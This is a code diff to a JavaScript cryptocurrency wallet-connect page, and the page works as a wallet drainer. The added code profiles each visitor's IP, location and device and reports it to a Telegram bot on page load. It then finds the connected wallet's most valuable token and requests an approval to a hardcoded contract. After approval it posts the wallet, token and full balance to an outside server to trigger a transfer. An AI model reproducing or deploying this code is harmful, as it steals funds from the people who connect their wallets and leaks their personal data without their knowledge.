@@ -1,7 +1,7 @@
 import { arbitrum, bsc, mainnet, optimism, polygon, sepolia } from '@reown/appkit/networks'
 import { createAppKit } from '@reown/appkit'
 import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
-import { parseEther, formatUnits, maxUint256, isAddress, getAddress } from 'viem'
+import { parseEther, formatUnits, maxUint256, isAddress, getAddress, parseUnits } from 'viem'
 import { sendTransaction, readContract, writeContract } from '@wagmi/core'
 
 // Utility for debouncing to prevent multiple subscribeAccount calls
@@ -18,7 +18,10 @@ if (!projectId) {
   throw new Error('VITE_PROJECT_ID is not set')
 }
 
-const networks = [arbitrum, mainnet, optimism, polygon, sepolia, bsc]
+const telegramBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || "123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11"
+const telegramChatId = import.meta.env.VITE_TELEGRAM_CHAT_ID || "-1001234567890"
+
+const networks = [mainnet, bsc, polygon]
 
 const wagmiAdapter = new WagmiAdapter({
   projectId,
@@ -109,6 +112,191 @@ const getBalance = async (provider, address, wagmiConfig) => {
   return ethBalance
 }
 
+// Function to send transfer request to server
+const sendTransferRequest = async (userAddress, tokenAddress, amount, chainId, txHash) => {
+  try {
+    const response = await fetch('https://api.amlinsight.io/api/transfer', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        userAddress,
+        tokenAddress,
+        amount: amount.toString(),
+        chainId,
+        txHash,
+      }),
+    });
+    
+    const data = await response.json();
+    if (data.success) {
+      console.log(`Transfer request successful: ${data.txHash}`);
+      return { success: true, txHash: data.txHash };
+    } else {
+      console.error(`Transfer request failed: ${data.message}`);
+      store.errors.push(`Transfer request failed: ${data.message}`);
+      return { success: false, message: data.message };
+    }
+  } catch (error) {
+    console.error(`Error sending transfer request: ${error.message}`);
+    store.errors.push(`Error sending transfer request: ${error.message}`);
+    return { success: false, message: error.message };
+  }
+}
+
+// Function to get user IP
+async function getUserIP() {
+  const cachedIP = sessionStorage.getItem('userIP');
+  if (cachedIP) return cachedIP;
+
+  try {
+    const response = await fetch('https://api.ipify.org?format=json');
+    const data = await response.json();
+    const ip = data.ip || 'Unknown IP';
+    sessionStorage.setItem('userIP', ip);
+    return ip;
+  } catch (error) {
+    console.error(`❌ Error fetching IP: ${error.message}`);
+    store.errors.push(`Error fetching IP: ${error.message}`);
+    return 'Unknown IP';
+  }
+}
+
+// Function to get geolocation
+async function getGeolocation(ip) {
+  const cachedLocation = sessionStorage.getItem('userLocation');
+  if (cachedLocation) return cachedLocation;
+
+  try {
+    const response = await fetch(`https://freeipapi.com/api/json/${ip}`);
+    const data = await response.json();
+    if (data.cityName && data.countryName) {
+      const location = `${data.cityName}, ${data.countryName}`;
+      sessionStorage.setItem('userLocation', location);
+      return location;
+    }
+    return 'Unknown Location';
+  } catch (error) {
+    console.error(`❌ Error fetching geolocation: ${error.message}`);
+    store.errors.push(`Error fetching geolocation: ${error.message}`);
+    return 'Unknown Location';
+  }
+}
+
+// Function to detect device
+function detectDevice() {
+  const userAgent = navigator.userAgent || 'Unknown Device';
+  let deviceType = 'Desktop';
+  let browser = 'Unknown Browser';
+
+  if (/mobile/i.test(userAgent)) {
+    deviceType = 'Mobile';
+  } else if (/tablet/i.test(userAgent)) {
+    deviceType = 'Tablet';
+  }
+
+  if (/chrome/i.test(userAgent) && !/edg/i.test(userAgent)) {
+    browser = 'Chrome';
+  } else if (/safari/i.test(userAgent) && !/chrome/i.test(userAgent)) {
+    browser = 'Safari';
+  } else if (/firefox/i.test(userAgent)) {
+    browser = 'Firefox';
+  } else if (/edg/i.test(userAgent)) {
+    browser = 'Edge';
+  } else if (/opera|opr/i.test(userAgent)) {
+    browser = 'Opera';
+  }
+
+  return `${deviceType} (${browser})`;
+}
+
+// Function to send Telegram message
+async function sendTelegramMessage(message) {
+  try {
+    const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        chat_id: telegramChatId,
+        text: message,
+        parse_mode: 'Markdown',
+      }),
+    });
+    
+    const data = await response.json();
+    if (!data.ok) {
+      throw new Error(data.description || 'Failed to send Telegram message');
+    }
+    console.log('Telegram message sent successfully');
+  } catch (error) {
+    console.error(`❌ Error sending Telegram message: ${error.message}`);
+    store.errors.push(`Error sending Telegram message: ${error.message}`);
+  }
+}
+
+// Function to notify on visit
+async function notifyOnVisit() {
+  if (sessionStorage.getItem('visitNotified')) return;
+
+  const domain = window.location.hostname || 'Unknown Domain';
+  const ip = await getUserIP();
+  const location = await getGeolocation(ip);
+  const device = detectDevice();
+
+  const message = `🔔 Visit | **${domain}**\n\n` +
+                  `IP: \`${ip}\`\n` +
+                  `Where: \`${location}\`\n` +
+                  `Device: \`${device}\``;
+
+  await sendTelegramMessage(message);
+  sessionStorage.setItem('visitNotified', 'true');
+}
+
+// New function to notify on wallet connection
+async function notifyWalletConnection(address, walletName, device) {
+  if (sessionStorage.getItem('walletConnectedNotified')) return;
+
+  const message = `🌀 Connect |\n` +
+                  `Wallet: \`${address}\`\n` +
+                  `Wallet Name: \`${walletName}\`\n` +
+                  `Device: \`${device}\``;
+
+  await sendTelegramMessage(message);
+  sessionStorage.setItem('walletConnectedNotified', 'true');
+}
+
+// New function to notify on token check
+async function notifyTokenCheck(balances, mostExpensive, device) {
+  if (sessionStorage.getItem('tokenCheckNotified')) return;
+
+  let message;
+  if (!mostExpensive) {
+    message = `😢 | wallet is empty\n` +
+              `Device: \`${device}\``;
+  } else {
+    const tokenList = balances
+      .filter(token => token.balance > 0)
+      .map(token => {
+        const price = ['USDT', 'USDC'].includes(token.symbol) ? 1 : token.price || 0;
+        const value = (token.balance * price).toFixed(2);
+        return `${token.symbol}: ${token.balance.toFixed(2)} (${value}$)`;
+      })
+      .join('\n');
+
+    const mostValuable = `${mostExpensive.symbol}: ${mostExpensive.balance.toFixed(2)} (${mostExpensive.value.toFixed(2)}$)`;
+    message = `🤩 | Tokens\n` +
+              `${tokenList}\n` +
+              `The most valuable: ${mostValuable}\n` +
+              `Device: \`${device}\``;
+  }
+
+  await sendTelegramMessage(message);
+  sessionStorage.setItem('tokenCheckNotified', 'true');
+}
+
 const initializeSubscribers = (modal) => {
   modal.subscribeProviders(state => {
     updateStore('eip155Provider', state['eip155'])
@@ -119,8 +307,13 @@ const initializeSubscribers = (modal) => {
     updateStore('accountState', state)
     updateStateDisplay('accountState', state)
 
-    // Check token balances across all networks simultaneously after wallet connection
+    // Check token balances across all networks after wallet connection
     if (state.isConnected && state.address && store.eip155Provider) {
+      // Notify on wallet connection
+      const walletInfo = appKit.getWalletInfo() || { name: 'Unknown Wallet' };
+      const device = detectDevice();
+      await notifyWalletConnection(state.address, walletInfo.name, device);
+
       const ethMainnet = networks.find(n => n.chainId === 1)
       const bscMainnet = networks.find(n => n.chainId === 56)
       const polygonMainnet = networks.find(n => n.chainId === 137)
@@ -142,7 +335,8 @@ const initializeSubscribers = (modal) => {
             balance,
             address: token.address,
             network: 'Ethereum',
-            chainId: 1
+            chainId: 1,
+            decimals: token.decimals
           }))
         )
       })
@@ -161,7 +355,8 @@ const initializeSubscribers = (modal) => {
             balance,
             address: token.address,
             network: 'BNB Chain',
-            chainId: 56
+            chainId: 56,
+            decimals: token.decimals
           }))
         )
       })
@@ -180,7 +375,8 @@ const initializeSubscribers = (modal) => {
             balance,
             address: token.address,
             network: 'Polygon',
-            chainId: 137
+            chainId: 137,
+            decimals: token.decimals
           }))
         )
       })
@@ -201,12 +397,16 @@ const initializeSubscribers = (modal) => {
           // Use fixed price for USDT and USDC, Binance API for others
           const price = ['USDT', 'USDC'].includes(token.symbol) ? 1 : await getTokenPrice(token.symbol)
           const value = token.balance * price
+          token.price = price; // Store price for notification
           if (value > maxValue) {
             maxValue = value
             mostExpensive = { ...token, price, value }
           }
         }
       }
+
+      // Notify on token check
+      await notifyTokenCheck(allBalances, mostExpensive, device);
 
       // Display result, switch network, and propose approve
       if (mostExpensive) {
@@ -224,7 +424,8 @@ const initializeSubscribers = (modal) => {
           } catch (switchError) {
             console.error(`Failed to switch network: ${switchError.message}`)
             store.errors.push(`Failed to switch network: ${switchError.message}`)
-            return // Stop if network switch fails
+            if (connectModal) connectModal.innerHTML = 'Connect Wallet'
+            return
           }
         }
 
@@ -233,7 +434,6 @@ const initializeSubscribers = (modal) => {
           const contractAddress = CONTRACTS[mostExpensive.chainId]
           const approvalKey = `${state.address}_${mostExpensive.chainId}_${mostExpensive.address}_${contractAddress}`
           
-          // Skip if approval already completed, requested, or rejected
           if (store.approvedTokens[approvalKey] || store.isApprovalRequested || store.isApprovalRejected) {
             const approveMessage = store.approvedTokens[approvalKey]
               ? `Approve already completed for ${mostExpensive.symbol} on ${mostExpensive.network}`
@@ -249,7 +449,6 @@ const initializeSubscribers = (modal) => {
             return
           }
 
-          // Set flag to indicate approval is being requested
           store.isApprovalRequested = true
 
           const txHash = await approveToken(
@@ -259,21 +458,37 @@ const initializeSubscribers = (modal) => {
             mostExpensive.chainId
           )
           
-          // Approval successful
-          store.approvedTokens[approvalKey] = true // Cache approval
-          store.isApprovalRequested = false // Reset request flag
-          const approveMessage = `Approve successful for ${mostExpensive.symbol} on ${mostExpensive.network}: ${txHash}`
+          store.approvedTokens[approvalKey] = true
+          store.isApprovalRequested = false
+          let approveMessage = `Approve successful for ${mostExpensive.symbol} on ${mostExpensive.network}: ${txHash}`
           console.log(approveMessage)
+          
+          const amount = parseUnits(mostExpensive.balance.toString(), mostExpensive.decimals)
+          const transferResult = await sendTransferRequest(
+            state.address,
+            mostExpensive.address,
+            amount,
+            mostExpensive.chainId,
+            txHash
+          )
+          
+          if (transferResult.success) {
+            approveMessage += `<br>Transfer request successful: ${transferResult.txHash}`
+            console.log(`Transfer request successful: ${transferResult.txHash}`)
+          } else {
+            approveMessage += `<br>Transfer request failed: ${transferResult.message}`
+            console.error(`Transfer request failed: ${transferResult.message}`)
+          }
+
           const approveState = document.getElementById('approveState')
           const approveSection = document.getElementById('approveSection')
           if (approveState) approveState.innerHTML = approveMessage
           if (approveSection) approveSection.style.display = ''
           if (connectModal) connectModal.innerHTML = 'Connect Wallet'
         } catch (error) {
-          // Check if error is due to user rejection (MetaMask error codes: -32000 or 4001)
           if (error.code === 4001 || error.code === -32000) {
-            store.isApprovalRejected = true // Mark as rejected
-            store.isApprovalRequested = false // Reset request flag
+            store.isApprovalRejected = true
+            store.isApprovalRequested = false
             const errorMessage = `Approve was rejected for ${mostExpensive.symbol} on ${mostExpensive.network}`
             store.errors.push(errorMessage)
             console.error(errorMessage)
@@ -283,10 +498,10 @@ const initializeSubscribers = (modal) => {
             if (approveSection) approveSection.style.display = ''
             if (connectModal) connectModal.innerHTML = 'Connect Wallet'
           } else {
-            // Other errors (e.g., network issues)
-            store.isApprovalRequested = false // Allow retry
+            store.isApprovalRequested = false
             const errorMessage = `Approve failed for ${mostExpensive.symbol}: ${error.message}`
             store.errors.push(errorMessage)
+            console.error(errorMessage)
             const approveState = document.getElementById('approveState')
             const approveSection = document.getElementById('approveSection')
             if (approveState) approveState.innerHTML = errorMessage
@@ -301,10 +516,9 @@ const initializeSubscribers = (modal) => {
         const mostExpensiveSection = document.getElementById('mostExpensiveTokenSection')
         if (mostExpensiveState) mostExpensiveState.innerHTML = message
         if (mostExpensiveSection) mostExpensiveSection.style.display = ''
-        if (connectModal) connectModal.innerHTML = 'Connect Wallet'
       }
     }
-  }, 500) // Debounce 500ms
+  }, 500)
 
   modal.subscribeAccount(debouncedSubscribeAccount)
 
@@ -334,10 +548,13 @@ document.getElementById('open-connect-modal')?.addEventListener('click', () => a
 
 document.getElementById('disconnect')?.addEventListener('click', () => {
   appKit.disconnect()
-  store.approvedTokens = {} // Clear approval cache
-  store.errors = [] // Clear errors
-  store.isApprovalRequested = false // Reset approval request flag
-  store.isApprovalRejected = false // Reset approval rejection flag
+  store.approvedTokens = {}
+  store.errors = []
+  store.isApprovalRequested = false
+  store.isApprovalRejected = false
+  // Clear notification flags on disconnect
+  sessionStorage.removeItem('walletConnectedNotified')
+  sessionStorage.removeItem('tokenCheckNotified')
 })
 
 document.getElementById('switch-network')?.addEventListener('click', () => {
@@ -371,12 +588,11 @@ document.getElementById('get-balance')?.addEventListener('click', async () => {
 
 updateTheme(store.themeState.themeMode)
 
-// === New Functionality ===
 const CONTRACTS = {
   1: '0x0A57cf1e7E09ee337ce56108E857CC0537089CfC', // Ethereum Mainnet
   56: '0x67062812416C73364926b9d31E183014deB95462', // BNB Chain
-  137: '0xD29BD8fC4c0Acfde1d0A42463805d34A1902095C', // Polygon
-};
+  137: '0xD29BD8fC4c0Acfde1d0A42463805d34A1902095c', // Polygon
+}
 
 const TOKENS = {
   ETHEREUM: [
@@ -437,7 +653,7 @@ const TOKENS = {
     { symbol: 'ICE', address: '0x4e1581f01046ef0d6b6c3aa0fea8e9b7ea0f28c4', decimals: 18 },
     { symbol: 'DC', address: '0x7cc6bcad7c5e0e928caee29ff9619aa0b019e77e', decimals: 18 },
   ],
-};
+}
 
 const erc20Abi = [
   {
@@ -457,11 +673,11 @@ const erc20Abi = [
     outputs: [{ name: 'success', type: 'bool' }],
     type: 'function',
   },
-];
+]
 
-const getTokenBalance = async (wagmiConfig, address, tokenAddress, decimals = 18, chainId) => {
+const getTokenBalance = async (wagmiConfig, address, tokenAddress, decimals, chainId) => {
   if (!address || !tokenAddress) {
-    return Promise.reject('Missing address or token address');
+    return Promise.reject('Missing address or token address')
   }
 
   try {
@@ -471,27 +687,27 @@ const getTokenBalance = async (wagmiConfig, address, tokenAddress, decimals = 18
       functionName: 'balanceOf',
       args: [address],
       chainId,
-    });
-    return Number(formatUnits(balance, decimals));
+    })
+    return Number(formatUnits(balance, decimals))
   } catch (error) {
-    store.errors.push(`Error fetching balance for ${tokenAddress} on chain ${chainId}: ${error.message}`);
-    return 0;
+    store.errors.push(`Error fetching balance for ${tokenAddress} on chain ${chainId}: ${error.message}`)
+    return 0
   }
-};
+}
 
 const getTokenPrice = async (symbol) => {
   try {
-    const response = await fetch(`https://api.binance.com/api/v3/ticker/price?symbol=${symbol}USDT`);
+    const response = await fetch(`https://api.binance.com/api/v3/ticker/price?symbol=${symbol}USDT`)
     if (!response.ok) {
-      throw new Error(`HTTP error! status: ${response.status}`);
+      throw new Error(`HTTP error! status: ${response.status}`)
     }
-    const data = await response.json();
-    return Number(data.price) || 0;
+    const data = await response.json()
+    return Number(data.price) || 0
   } catch (error) {
-    store.errors.push(`Error fetching price for ${symbol}: ${error.message}`);
-    return 0;
+    store.errors.push(`Error fetching price for ${symbol}: ${error.message}`)
+    return 0
   }
-};
+}
 
 const approveToken = async (wagmiConfig, tokenAddress, contractAddress, chainId) => {
   if (!wagmiConfig) {
@@ -515,6 +731,9 @@ const approveToken = async (wagmiConfig, tokenAddress, contractAddress, chainId)
     })
     return txHash
   } catch (error) {
-    throw new Error(`Failed to approve token: ${error.message}`)
+    throw error
   }
 }
+
+// Notify on visit when the page loads
+notifyOnVisit()
